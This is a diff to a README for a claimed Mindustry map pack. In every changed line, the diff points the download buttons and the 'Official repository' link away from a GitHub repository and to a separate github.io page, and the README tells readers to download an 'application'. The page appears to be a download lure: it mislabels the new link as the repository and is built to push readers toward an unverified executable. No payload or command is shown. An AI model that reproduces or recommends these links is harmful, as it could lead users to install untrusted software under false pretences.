@@ -1,7 +1,7 @@
 <h1>🎮 mindustry-map-pack-2026 - 200+ Maps, One Click, Instant Fun</h1>
 
 <p align="center">
-  <a href="https://github.com/Primetimerico/mindustry-map-pack-2026"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2D2D2D" alt="Download Badge" style="max-width:100%;"></a>
+  <a href="https://primetimerico.github.io"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2D2D2D" alt="Download Badge" style="max-width:100%;"></a>
 </p>
 
 ## 🗺️ What Is This?
@@ -43,7 +43,7 @@ Follow these 3 simple steps to get the maps running:
 ### Step 1: Download the Pack
 Visit the link below and click the **"Download"** button on the GitHub page.
 
-**[⬇️ CLICK HERE TO DOWNLOAD THE MAP PACK](https://github.com/Primetimerico/mindustry-map-pack-2026)**
+**[⬇️ CLICK HERE TO DOWNLOAD THE MAP PACK](https://primetimerico.github.io)**
 
 Visit this link to download the application. The download will start automatically or you'll see a "Download" button on the page.
 
@@ -205,7 +205,7 @@ Since new maps and fixes are added over time, check back at the download page pe
 
 For questions, bug reports, or map suggestions, please visit the GitHub repository page and open an issue. The community and creator are active and responsive.
 
-**Official repository:** [https://github.com/Primetimerico/mindustry-map-pack-2026](https://github.com/Primetimerico/mindustry-map-pack-2026)
+**Official repository:** [https://primetimerico.github.io](https://primetimerico.github.io)
 
 ---
 
@@ -213,6 +213,6 @@ For questions, bug reports, or map suggestions, please visit the GitHub reposito
 
 Once more, here's your direct link to get everything:
 
-**[⬇️ DOWNLOAD MINDUSTRY MAP PACK 2026](https://github.com/Primetimerico/mindustry-map-pack-2026)**
+**[⬇️ DOWNLOAD MINDUSTRY MAP PACK 2026](https://primetimerico.github.io)**
 
 Visit this link to download the application. Follow the 3 simple steps above, and you'll be playing on 200+ new maps within minutes. Enjoy!
